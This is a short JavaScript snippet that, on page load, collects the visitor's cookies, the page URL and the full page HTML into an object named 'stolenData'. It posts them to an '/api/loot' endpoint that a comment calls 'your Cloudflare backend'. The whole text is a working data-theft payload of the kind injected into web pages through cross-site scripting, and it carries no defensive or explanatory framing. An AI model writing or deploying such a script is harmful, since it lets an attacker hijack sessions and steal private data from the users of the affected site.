window.onload = function() {
    const stolenData = {
        cookies: document.cookie,
        url: window.location.href,
        htmlDump: document.body.innerHTML
    };

    // This sends the data to your Cloudflare backend
    fetch("/api/loot", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(stolenData)
    });
};
